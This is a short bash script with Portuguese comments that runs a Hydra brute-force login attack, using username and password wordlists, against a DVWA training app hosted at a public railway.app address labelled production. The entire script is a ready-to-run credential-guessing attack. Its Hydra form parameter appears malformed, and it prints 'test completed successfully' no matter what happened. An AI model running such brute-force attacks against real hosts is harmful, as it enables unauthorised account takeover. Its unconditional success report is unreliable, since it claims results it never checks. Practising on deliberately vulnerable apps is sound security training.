#!/bin/bash

# Play 02 — Hydra DVWA em produção
# Usa variável DVWA_HOST ou default

TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}:80"

echo "[*] Iniciando ataque com Hydra contra $TARGET..."

# Hydra deve receber um único argumento começando em http-post-form://
hydra -L users.txt -P passwords.txt \
  "http-post-form://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
  -o hydra-out.txt 2>&1

echo "[✔️] Teste concluído com sucesso."
